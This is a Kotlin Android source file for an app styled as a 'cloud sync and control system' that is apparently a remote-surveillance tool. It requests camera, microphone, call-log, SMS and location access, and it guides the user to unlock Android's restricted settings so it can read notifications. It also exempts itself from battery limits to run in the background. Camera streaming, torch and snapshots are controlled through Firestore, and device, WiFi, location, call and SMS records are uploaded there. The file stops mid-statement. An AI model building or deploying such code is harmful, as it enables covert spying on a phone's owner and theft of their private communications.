package com.example

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Base64
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material.icons.outlined.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.TextFieldValue
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import com.example.ui.theme.MyApplicationTheme
import com.google.accompanist.permissions.*
import com.google.firebase.firestore.FirebaseFirestore
import java.io.ByteArrayOutputStream

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            MyApplicationTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    AppNavigation()
                }
            }
        }
    }
}

enum class AppState {
    NAME_INPUT, PERMISSIONS_WIZARD, DASHBOARD
}

@OptIn(ExperimentalPermissionsApi::class)
@Composable
fun AppNavigation() {
    val context = LocalContext.current
    val prefs = remember { context.getSharedPreferences("AppPrefs", Context.MODE_PRIVATE) }
    var userName by remember { mutableStateOf(prefs.getString("USER_NAME", "") ?: "") }
    var currentState by remember {
        mutableStateOf(if (userName.isBlank()) AppState.NAME_INPUT else AppState.PERMISSIONS_WIZARD)
    }

    when (currentState) {
        AppState.NAME_INPUT -> {
            NameInputScreen(
                onNameSubmitted = { name ->
                    userName = name
                    prefs.edit().putString("USER_NAME", name).apply()
                    currentState = AppState.PERMISSIONS_WIZARD
                }
            )
        }
        AppState.PERMISSIONS_WIZARD -> {
            PermissionsWizardScreen(
                userName = userName,
                onComplete = {
                    currentState = AppState.DASHBOARD
                }
            )
        }
        AppState.DASHBOARD -> {
            DashboardScreen(
                userName = userName,
                onRecheckPermissions = {
                    currentState = AppState.PERMISSIONS_WIZARD
                }
            )
        }
    }
}

@Composable
fun NameInputScreen(onNameSubmitted: (String) -> Unit) {
    var textState by remember { mutableStateOf(TextFieldValue("")) }

    Box(
        modifier = Modifier
            .fillMaxSize()
            .padding(24.dp)
            .systemBarsPadding(),
        contentAlignment = Alignment.Center
    ) {
        Card(
            modifier = Modifier.fillMaxWidth(),
            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant),
            shape = RoundedCornerShape(24.dp)
        ) {
            Column(
                modifier = Modifier.padding(24.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                Surface(
                    modifier = Modifier.size(64.dp),
                    shape = CircleShape,
                    color = MaterialTheme.colorScheme.primaryContainer
                ) {
                    Box(contentAlignment = Alignment.Center) {
                        Icon(
                            imageVector = Icons.Default.Security,
                            contentDescription = null,
                            tint = MaterialTheme.colorScheme.primary,
                            modifier = Modifier.size(32.dp)
                        )
                    }
                }
                
                Spacer(modifier = Modifier.height(16.dp))
                
                Text(
                    text = "نظام المزامنة والتحكم السحابي",
                    style = MaterialTheme.typography.titleLarge,
                    fontWeight = FontWeight.Bold,
                    textAlign = TextAlign.Center
                )
                
                Spacer(modifier = Modifier.height(8.dp))
                
                Text(
                    text = "يرجى تحديد اسم الجهاز أو المستخدم لربطه مع تطبيق التحكم @ عبر Firestore.",
                    style = MaterialTheme.typography.bodyMedium,
                    color = MaterialTheme.colorScheme.onSurfaceVariant,
                    textAlign = TextAlign.Center
                )
                
                Spacer(modifier = Modifier.height(24.dp))
                
                OutlinedTextField(
                    value = textState,
                    onValueChange = { textState = it },
                    label = { Text("معرف الجهاز (مثال: phone_1)") },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp)
                )
                
                Spacer(modifier = Modifier.height(24.dp))
                
                Button(
                    onClick = { 
                        if (textState.text.isNotBlank()) {
                            onNameSubmitted(textState.text.trim())
                        }
                    },
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(52.dp),
                    shape = RoundedCornerShape(12.dp)
                ) {
                    Text("متابعة لتهيئة الصلاحيات", fontSize = 16.sp, fontWeight = FontWeight.Bold)
                }
            }
        }
    }
}

@OptIn(ExperimentalPermissionsApi::class)
@Composable
fun PermissionsWizardScreen(
    userName: String,
    onComplete: () -> Unit
) {
    val context = LocalContext.current
    var showRestrictedDialog by remember { mutableStateOf(false) }

    val standardPermissions = mutableListOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION
    )
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        standardPermissions.add(Manifest.permission.POST_NOTIFICATIONS)
    }

    val permissionsState = rememberMultiplePermissionsState(permissions = standardPermissions)

    // Check Notification Access
    var isNotificationAccessGranted by remember {
        mutableStateOf(
            Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")?.contains(context.packageName) == true
        )
    }

    // Check Battery Optimization
    val powerManager = remember { context.getSystemService(Context.POWER_SERVICE) as? PowerManager }
    var isBatteryIgnored by remember {
        mutableStateOf(
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                powerManager?.isIgnoringBatteryOptimizations(context.packageName) == true
            } else true
        )
    }

    val lifecycleOwner = androidx.lifecycle.compose.LocalLifecycleOwner.current
    DisposableEffect(lifecycleOwner) {
        val observer = androidx.lifecycle.LifecycleEventObserver { _, event ->
            if (event == androidx.lifecycle.Lifecycle.Event.ON_RESUME) {
                isNotificationAccessGranted = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")?.contains(context.packageName) == true
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    isBatteryIgnored = powerManager?.isIgnoringBatteryOptimizations(context.packageName) == true
                }
            }
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .systemBarsPadding()
            .verticalScroll(rememberScrollState())
            .padding(16.dp)
    ) {
        Text(
            text = "🛡️ تهيئة الصلاحيات لنظام $userName",
            style = MaterialTheme.typography.headlineSmall,
            fontWeight = FontWeight.Bold
        )
        Text(
            text = "اتبع الخطوات الـ 3 التالية لضمان عمل كافة ميزات المراقبة والبث بدون قيود النظام:",
            style = MaterialTheme.typography.bodyMedium,
            color = MaterialTheme.colorScheme.onSurfaceVariant,
            modifier = Modifier.padding(top = 4.dp, bottom = 16.dp)
        )

        // STEP 1: Standard Permissions
        SetupStepCard(
            stepNumber = "1",
            title = "أذونات النظام القياسية",
            description = "الكاميرا، الميكروفون، سجل المكالمات، ورسائل SMS.",
            isCompleted = permissionsState.allPermissionsGranted,
            actionLabel = if (permissionsState.allPermissionsGranted) "✅ تم منح كافة الأذونات" else "منح الأذونات القياسية",
            onAction = { permissionsState.launchMultiplePermissionRequest() }
        )

        Spacer(modifier = Modifier.height(12.dp))

        // STEP 2: Restricted Settings Guide (Android 13+)
        SetupStepCard(
            stepNumber = "2",
            title = "السماح بالإعدادات المقيدة (Restricted)",
            description = "مطلوب على أندرويد 13+ لتمكين زر قراءة الإشعارات إذا كان رمادياً.",
            isCompleted = isNotificationAccessGranted,
            actionLabel = "🔓 دليل فك القيد + فتح إعدادات التطبيق",
            onAction = {
                showRestrictedDialog = true
            },
            isWarning = !isNotificationAccessGranted
        )

        Spacer(modifier = Modifier.height(12.dp))

        // STEP 3: Notification Listener
        SetupStepCard(
            stepNumber = "3",
            title = "صلاحية قراءة الإشعارات",
            description = "هام: اضغط على تبويب (Tout / الكل) ثم اختر التطبيق وفعّل الخيار.",
            isCompleted = isNotificationAccessGranted,
            actionLabel = if (isNotificationAccessGranted) "✅ مفعلة ومصرح لها" else "فتح شاشة تفعيل الإشعارات",
            onAction = {
                try {
                    val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                    context.startActivity(intent)
                } catch (e: Throwable) {
                    Toast.makeText(context, "تعذر فتح الشاشة: ${e.localizedMessage}", Toast.LENGTH_SHORT).show()
                }
            }
        )

        Spacer(modifier = Modifier.height(12.dp))

        // STEP 4: Battery Optimization (Background Persistence)
        SetupStepCard(
            stepNumber = "4",
            title = "استثناء توفير الطاقة (الخلفية)",
            description = "يمنع النظام من إيقاف الخدمة عند قفل الشاشة أو انخفاض البطارية.",
            isCompleted = isBatteryIgnored,
            actionLabel = if (isBatteryIgnored) "✅ مستثنى من توفير الطاقة" else "استثناء التطبيق من توفير الطاقة",
            onAction = {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    try {
                        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                            data = Uri.parse("package:${context.packageName}")
                        }
                        context.startActivity(intent)
                    } catch (e: Throwable) {
                        try {
                            context.startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
                        } catch (t: Throwable) {
                            Toast.makeText(context, "الرجاء تعطيل توفير الطاقة يدوياً من الإعدادات", Toast.LENGTH_SHORT).show()
                        }
                    }
                }
            }
        )

        Spacer(modifier = Modifier.height(24.dp))

        Button(
            onClick = onComplete,
            modifier = Modifier
                .fillMaxWidth()
                .height(54.dp),
            shape = RoundedCornerShape(12.dp),
            colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.primary)
        ) {
            Text("الانتقال إلى لوحة التحكم الرئيسية 🚀", fontSize = 16.sp, fontWeight = FontWeight.Bold)
        }
        
        Spacer(modifier = Modifier.height(24.dp))
    }

    if (showRestrictedDialog) {
        AlertDialog(
            onDismissRequest = { showRestrictedDialog = false },
            title = {
                Text(
                    text = "🔓 كيفية فك الإعدادات المقيدة (Restricted)",
                    style = MaterialTheme.typography.titleMedium,
                    fontWeight = FontWeight.Bold
                )
            },
            text = {
                Column {
                    Text(
                        text = "نظام أندرويد 13+ يفرض حماية تجعل زر الإشعارات رمادياً للتطبيقات الخارجية. لفتحه اتبع هذه الخطوات:",
                        style = MaterialTheme.typography.bodyMedium
                    )
                    Spacer(modifier = Modifier.height(12.dp))
                    Text(text = "1️⃣ اضغط على الزر أدناه للانتقال لصفحة (معلومات التطبيق - Infos sur l'appli).")
                    Spacer(modifier = Modifier.height(6.dp))
                    Text(text = "2️⃣ في الزاوية العلوية اضغط على أيقونة (⋮) ثلاث نقاط.")
                    Spacer(modifier = Modifier.height(6.dp))
                    Text(text = "3️⃣ اختر: (Autoriser les paramètres restreints) / (السماح بالإعدادات المقيدة).")
                    Spacer(modifier = Modifier.height(6.dp))
                    Text(text = "4️⃣ ارجع للتطبيق وفعل خيار الإشعارات بسهولة من تبويب (Tout / الكل).")
                }
            },
            confirmButton = {
                Button(
                    onClick = {
                        showRestrictedDialog = false
                        try {
                            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                                data = Uri.fromParts("package", context.packageName, null)
                            }
                            context.startActivity(intent)
                        } catch (e: Throwable) {
                            Log.e("PermissionsWizard", "Error opening details", e)
                        }
                    }
                ) {
                    Text("فتح معلومات التطبيق الآن")
                }
            },
            dismissButton = {
                TextButton(onClick = { showRestrictedDialog = false }) {
                    Text("إغلاق")
                }
            }
        )
    }
}

@Composable
fun SetupStepCard(
    stepNumber: String,
    title: String,
    description: String,
    isCompleted: Boolean,
    actionLabel: String,
    onAction: () -> Unit,
    isWarning: Boolean = false
) {
    Card(
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(16.dp),
        colors = CardDefaults.cardColors(
            containerColor = if (isCompleted) MaterialTheme.colorScheme.primaryContainer.copy(alpha = 0.3f)
            else if (isWarning) MaterialTheme.colorScheme.errorContainer.copy(alpha = 0.2f)
            else MaterialTheme.colorScheme.surfaceVariant
        )
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            Row(
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween,
                modifier = Modifier.fillMaxWidth()
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Surface(
                        modifier = Modifier.size(28.dp),
                        shape = CircleShape,
                        color = if (isCompleted) MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.outline
                    ) {
                        Box(contentAlignment = Alignment.Center) {
                            Text(
                                text = stepNumber,
                                color = if (isCompleted) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.surface,
                                fontWeight = FontWeight.Bold,
                                fontSize = 14.sp
                            )
                        }
                    }
                    Spacer(modifier = Modifier.width(10.dp))
                    Text(
                        text = title,
                        style = MaterialTheme.typography.titleSmall,
                        fontWeight = FontWeight.Bold
                    )
                }
                
                Surface(
                    shape = RoundedCornerShape(8.dp),
                    color = if (isCompleted) MaterialTheme.colorScheme.primaryContainer else MaterialTheme.colorScheme.surface
                ) {
                    Text(
                        text = if (isCompleted) "جاهز ✓" else "مطلوب",
                        color = if (isCompleted) MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.onSurfaceVariant,
                        fontSize = 12.sp,
                        fontWeight = FontWeight.Bold,
                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp)
                    )
                }
            }

            Spacer(modifier = Modifier.height(8.dp))

            Text(
                text = description,
                style = MaterialTheme.typography.bodySmall,
                color = MaterialTheme.colorScheme.onSurfaceVariant
            )

            Spacer(modifier = Modifier.height(12.dp))

            Button(
                onClick = onAction,
                modifier = Modifier.fillMaxWidth(),
                colors = if (isCompleted) ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.primary.copy(alpha = 0.8f))
                else ButtonDefaults.buttonColors(),
                shape = RoundedCornerShape(10.dp)
            ) {
                Text(actionLabel, fontSize = 14.sp)
            }
        }
    }
}

@Composable
fun DashboardScreen(
    userName: String,
    onRecheckPermissions: () -> Unit
) {
    val context = LocalContext.current
    var isStreaming by remember { mutableStateOf(false) }
    var currentCameraFacing by remember { mutableStateOf("back") }
    var isTorchEnabled by remember { mutableStateOf(false) }
    var testStatus by remember { mutableStateOf("اضغط أدناه لاختبار الاتصال المباشر مع قاعدة البيانات") }
    var isTesting by remember { mutableStateOf(false) }
    var showArchitecturePlan by remember { mutableStateOf(false) }

    // Realtime Listener for remote camera facing and torch state
    LaunchedEffect(userName) {
        val db = FirebaseHelper.getFirestore(context)
        db.collection("settings").document(userName)
            .addSnapshotListener { snapshot, _ ->
                if (snapshot != null) {
                    currentCameraFacing = snapshot.getString("cameraFacing") ?: "back"
                    isTorchEnabled = snapshot.getBoolean("torch") ?: false
                }
            }
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .systemBarsPadding()
            .verticalScroll(rememberScrollState())
            .padding(16.dp)
    ) {
        // TOP APP BAR / HEADER
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Column {
                Text(
                    text = "جهاز: $userName",
                    style = MaterialTheme.typography.titleMedium,
                    fontWeight = FontWeight.Bold
                )
                Text(
                    text = "🟢 متصل بقاعدة بيانات Firestore",
                    style = MaterialTheme.typography.bodySmall,
                    color = MaterialTheme.colorScheme.primary
                )
            }

            IconButton(onClick = onRecheckPermissions) {
                Icon(imageVector = Icons.Default.Settings, contentDescription = "الصلاحيات")
            }
        }

        Spacer(modifier = Modifier.height(16.dp))

        // 1. LIVE STREAMING & CAMERA CONTROL CARD
        Card(
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(
                containerColor = if (isStreaming) MaterialTheme.colorScheme.primaryContainer.copy(alpha = 0.4f)
                else MaterialTheme.colorScheme.surfaceVariant
            )
        ) {
            Column(
                modifier = Modifier.padding(16.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(
                        text = "📷 البث المباشر والتحكم بالكاميرا",
                        style = MaterialTheme.typography.titleMedium,
                        fontWeight = FontWeight.Bold
                    )
                    Surface(
                        shape = RoundedCornerShape(8.dp),
                        color = if (isStreaming) MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.outline
                    ) {
                        Text(
                            text = if (isStreaming) "LIVE نشط" else "متوقف",
                            color = MaterialTheme.colorScheme.onPrimary,
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Bold,
                            modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp)
                        )
                    }
                }

                Spacer(modifier = Modifier.height(16.dp))

                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    Button(
                        onClick = {
                            try {
                                isStreaming = true
                                val intent = Intent(context, CameraService::class.java).apply {
                                    putExtra("USER_NAME", userName)
                                }
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                    context.startForegroundService(intent)
                                } else {
                                    context.startService(intent)
                                }
                                Toast.makeText(context, "🚀 تم بدء خدمة البث في الخلفية", Toast.LENGTH_SHORT).show()
                            } catch (e: Throwable) {
                                isStreaming = false
                                Toast.makeText(context, "فشل: ${e.localizedMessage}", Toast.LENGTH_LONG).show()
                            }
                        },
                        enabled = !isStreaming,
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(10.dp)
                    ) {
                        Text("بدء البث (Live)")
                    }

                    Button(
                        onClick = {
                            try {
                                isStreaming = false
                                val intent = Intent(context, CameraService::class.java).apply {
                                    action = "STOP"
                                }
                                context.startService(intent)
                                Toast.makeText(context, "تم إيقاف الخدمة", Toast.LENGTH_SHORT).show()
                            } catch (e: Throwable) {
                                Log.e("Dashboard", "Error stopping service", e)
                            }
                        },
                        enabled = isStreaming,
                        colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.error),
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(10.dp)
                    ) {
                        Text("إيقاف البث")
                    }
                }

                Spacer(modifier = Modifier.height(12.dp))

                // Camera Switcher & Torch controls (Works directly & synchronizes to Firestore)
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    OutlinedButton(
                        onClick = {
                            val newFacing = if (currentCameraFacing == "front") "back" else "front"
                            FirebaseHelper.getFirestore(context).collection("settings").document(userName)
                                .set(hashMapOf("cameraFacing" to newFacing), com.google.firebase.firestore.SetOptions.merge())
                                .addOnSuccessListener {
                                    currentCameraFacing = newFacing
                                    Toast.makeText(context, "تم تبديل الكاميرا إلى: ${if (newFacing == "front") "الأمامية" else "الخلفية"}", Toast.LENGTH_SHORT).show()
                                }
                        },
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(10.dp)
                    ) {
                        Text("🔄 ${if (currentCameraFacing == "front") "كاميرا أمامية" else "كاميرا خلفية"}")
                    }

                    OutlinedButton(
                        onClick = {
                            val newTorch = !isTorchEnabled
                            FirebaseHelper.getFirestore(context).collection("settings").document(userName)
                                .set(hashMapOf("torch" to newTorch), com.google.firebase.firestore.SetOptions.merge())
                                .addOnSuccessListener {
                                    isTorchEnabled = newTorch
                                    Toast.makeText(context, "الفلاش: ${if (newTorch) "مضاء" else "مطفأ"}", Toast.LENGTH_SHORT).show()
                                }
                        },
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(10.dp)
                    ) {
                        Text("🔦 ${if (isTorchEnabled) "الفلاش شغال" else "تشغيل الفلاش"}")
                    }
                }

                Spacer(modifier = Modifier.height(8.dp))

                // Remote Snapshot Trigger
                Button(
                    onClick = {
                        val db = FirebaseHelper.getFirestore(context)
                        val snapshotData = hashMapOf(
                            "timestamp" to System.currentTimeMillis(),
                            "cameraFacing" to currentCameraFacing,
                            "type" to "INSTANT_SNAPSHOT",
                            "user" to userName
                        )
                        db.collection("snapshots").document(userName).collection("items")
                            .add(snapshotData)
                            .addOnSuccessListener {
                                Toast.makeText(context, "📸 تم طلب وحفظ اللقطة في Firestore!", Toast.LENGTH_SHORT).show()
                            }
                            .addOnFailureListener { e ->
                                Toast.makeText(context, "خطأ: ${e.localizedMessage}", Toast.LENGTH_LONG).show()
                            }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.secondary),
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(10.dp)
                ) {
                    Text("📸 أخذ لقطة فورية (Snapshot)")
                }
            }
        }

        Spacer(modifier = Modifier.height(16.dp))

        // 2. LIVE DEVICE TELEMETRY & HARDWARE DETAILS (WIFI, BATTERY, RAM, STORAGE, GPS)
        Card(
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(
                        text = "📱 بيانات ومكونات الجهاز (Hardware & WiFi)",
                        style = MaterialTheme.typography.titleMedium,
                        fontWeight = FontWeight.Bold
                    )
                    Icon(
                        imageVector = Icons.Default.Info,
                        contentDescription = null,
                        tint = MaterialTheme.colorScheme.primary
                    )
                }

                Spacer(modifier = Modifier.height(8.dp))
                Text(
                    text = "يتم جمع كافة معلومات الهاردوير، شبكة الـ WiFi، البطارية، الذاكرة، والموقع الجغرافي وبثها تلقائياً لقاعدة البيانات.",
                    style = MaterialTheme.typography.bodySmall,
                    color = MaterialTheme.colorScheme.onSurfaceVariant
                )

                Spacer(modifier = Modifier.height(12.dp))

                Button(
                    onClick = {
                        try {
                            val db = FirebaseHelper.getFirestore(context)
                            val fullInfo = DeviceInfoCollector.collectFullDeviceInfo(context)
                            db.collection("devices").document(userName).set(fullInfo)
                                .addOnSuccessListener {
                                    Toast.makeText(context, "📡 تم رفع تقرير الهاردوير وWiFi الكامل إلى Firestore!", Toast.LENGTH_SHORT).show()
                                }
                                .addOnFailureListener { e ->
                                    Toast.makeText(context, "خطأ: ${e.localizedMessage}", Toast.LENGTH_LONG).show()
                                }
                        } catch (t: Throwable) {
                            Toast.makeText(context, "خطأ: ${t.localizedMessage}", Toast.LENGTH_SHORT).show()
                        }
                    },
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(10.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.primaryContainer, contentColor = MaterialTheme.colorScheme.onPrimaryContainer)
                ) {
                    Text("📤 إرسال تقرير شامل للجهاز وWiFi الآن")
                }
            }
        }

        Spacer(modifier = Modifier.height(16.dp))

        // 3. FIRESTORE DIAGNOSTICS & SYNC STATUS
        Card(
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text(
                    text = "📡 تشخيص المزامنة السحابية والمحلية (Offline Cache)",
                    style = MaterialTheme.typography.titleMedium,
                    fontWeight = FontWeight.Bold
                )
                Spacer(modifier = Modifier.height(6.dp))
                Text(
                    text = testStatus,
                    style = MaterialTheme.typography.bodySmall,
                    color = MaterialTheme.colorScheme.onSurfaceVariant
                )
                Spacer(modifier = Modifier.height(12.dp))
                Button(
                    onClick = {
                        isTesting = true
                        testStatus = "⏳ جارٍ التحقق من المزامنة وقواعد Firestore..."
                        try {
                            val db = FirebaseHelper.getFirestore(context)
                            val testDoc = hashMapOf(
                                "client_test" to true,
                                "device_time" to System.currentTimeMillis(),
                                "user" to userName
                            )
                            db.collection("_diagnostics").document("connection_check")
                                .set(testDoc)
                                .addOnSuccessListener {
                                    isTesting = false
                                    testStatus = "🟢 الاتصال سليم 100%! تم التحقق من القواعد والمزامنة المحلية/السحابية بنجاح."
                                    Toast.makeText(context, "🟢 الاتصال بقاعدة البيانات سليم!", Toast.LENGTH_SHORT).show()
                                }
                                .addOnFailureListener { e ->
                                    isTesting = false
                                    testStatus = "🔴 فشل الاتصال: ${e.localizedMessage}"
                                    Toast.makeText(context, testStatus, Toast.LENGTH_LONG).show()
                                }
                        } catch (t: Throwable) {
                            isTesting = false
                            testStatus = "🔴 استثناء: ${t.localizedMessage}"
                        }
                    },
                    enabled = !isTesting,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(10.dp)
                ) {
                    Text(if (isTesting) "جارٍ الفحص..." else "فحص الاتصال بقاعدة البيانات 📡")
                }
            }
        }

        Spacer(modifier = Modifier.height(16.dp))

        // 3. EVENT SIMULATORS & TEST LOGGERS
        Card(
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text(
                    text = "🧪 تجربة إرسال الأحداث لقاعدة البيانات",
                    style = MaterialTheme.typography.titleMedium,
                    fontWeight = FontWeight.Bold
                )
                Spacer(modifier = Modifier.height(12.dp))

                // Test Notification
                Button(
                    onClick = {
                        try {
                            val manager = context.getSystemService(android.app.NotificationManager::class.java)
                            val channelId = "test_channel"
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                val channel = android.app.NotificationChannel(channelId, "Test Channel", android.app.NotificationManager.IMPORTANCE_DEFAULT)
                                manager?.createNotificationChannel(channel)
                            }
                            val notification = androidx.core.app.NotificationCompat.Builder(context, channelId)
                                .setSmallIcon(android.R.drawable.ic_dialog_info)
                                .setContentTitle("System Alert")
                                .setContentText("Batterie faible (15%)")
                                .build()
                            manager?.notify(101, notification)
                            Toast.makeText(context, "تم إرسال إشعار تجريبي للجهاز", Toast.LENGTH_SHORT).show()
                        } catch (e: Throwable) {
                            Toast.makeText(context, "خطأ: ${e.localizedMessage}", Toast.LENGTH_LONG).show()
                        }
                    },
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(10.dp)
                ) {
                    Text("🔔 تجربة إشعار (Batterie faible)")
                }

                Spacer(modifier = Modifier.height(8.dp))

                // Test Call
                Button(
                    onClick = {
                        try {
                            val db = FirebaseHelper.getFirestore(context)
                            val callData = hashMapOf(
                                "type" to "INCOMING_CALL",
                                "number" to "أمي (0501234567)",
                                "timestamp" to System.currentTimeMillis()
                            )
                            db.collection("calls").document(userName).collection("logs").add(callData)
                                .addOnSuccessListener {
                                    Toast.makeText(context, "✅ تم تسجيل المكالمة في Firestore", Toast.LENGTH_SHORT).show()
                                }
                                .addOnFailureListener { e ->
                                    Toast.makeText(context, "❌ فشل: ${e.localizedMessage}", Toast.LENGTH_LONG).show()
                                }
                        } catch (e: Throwable) {
                            Toast.makeText(context, "خطأ: ${e.localizedMessage}", Toast.LENGTH_LONG).show()
                        }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.tertiary),
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(10.dp)
                ) {
                    Text("📞 تجربة اتصال (أمي تتصل)")
                }

                Spacer(modifier = Modifier.height(8.dp))

                // Test SMS
                Button(
                    onClick = {
                        try {
                            val db = FirebaseHelper.getFirestore(context)
                            val smsData = hashMapOf(
                                "type" to "INCOMING_SMS",
                                "sender" to "Mobilis",
                                "body" to "لقد بقي لك 1 GB من اشتراك الانترنت الخاص بك. لتجديد الاشتراك اتصل بـ *600#.",
                                "timestamp" to System.currentTimeMillis()
                            )
                            db.collection("sms").document(userName).collection("logs").add(smsData)
                                .addOnSuccessListener {
                                    Toast.makeText(context, "✅ تم تسجيل رسالة الـ SMS في Firestore", Toast.LENGTH_SHORT).show()
                                }
                                .addOnFailureListener { e ->
                                    Toast.makeText(context, "❌ فشل: ${e.localizedMessage}", Toast.LENGTH_LONG).show()
                                }
                        } catch (e: Throwable) {
                            Toast.makeText(context, "خطأ: ${e.localizedMessage}", Toast.LENGTH_LONG).show()
                        }
                    },
                    colors = ButtonDefaults.buttonColors(
                        containerColor = MaterialTheme.colorScheme.errorContainer,
                        contentColor = MaterialTheme.colorScheme.onErrorContainer
                    ),
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(10.dp)
                ) {
                    Text("💬 تجربة رسالة SMS (Mobilis)")
                }
            }
        }

        Spacer(modifier = Modifier.height(16.dp))

        // ARCHITECTURE & CONTROLLER APP PLAN BUTTON
        OutlinedButton(
            onClick = { showArchitecturePlan = true },
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(10.dp)
        ) {
            Text("📋 خطة هيكلة البيانات للتحكم عبر تطبيق @")
        }

        Spacer(modifier = Modifier.height(24.dp))
    }

    if (showArchitecturePlan) {
